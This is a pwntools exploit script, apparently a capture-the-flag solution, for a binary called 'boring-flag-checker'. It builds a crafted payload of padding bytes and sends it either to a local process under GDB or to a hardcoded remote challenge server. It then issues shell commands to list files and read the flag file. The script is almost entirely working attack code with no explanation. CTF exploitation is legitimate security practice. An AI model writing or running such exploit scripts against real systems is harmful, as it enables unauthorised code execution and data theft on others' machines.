#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
context.log_level = 'info'

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6')

exe = ELF('./boring-flag-checker.patched')
libc = ELF('./libc.so.6')

rop = ROP(exe)

host, port = "193.57.159.27", "20983"
#host, port = "127.0.0.1", "1337"

payload = b''
for i in range(0x138):
  payload += b'\x00'
for i in range(0xce):
  payload += b'\x07'
payload += b'\x00'
for i in range(0xfc):
  payload += b'\x07'
payload += b'\x00'
for i in range(0xc):
  payload += b'\x07'



if args.LOCAL:
  f = open('prog.bin', 'wb')
  f.write(payload)
  f.close()


if args.REMOTE:
  p = remote(host,port)
  p.sendlineafter('program: ', payload)

else:
  if args.GDB:
    p = gdb.debug([exe.path, 'prog.bin'], gdbscript = '''
    source ~/gdb.plugins/gef/gef.py
    tbreak main
    c
    pie breakpoint *0x15d1
    pie breakpoint *0x16ad
    c
     ''')
  else:
    p = process([exe.path, 'prog.bin'])

p.sendline('ls 1>&2;cat flag* 1>&2;')
p.interactive()

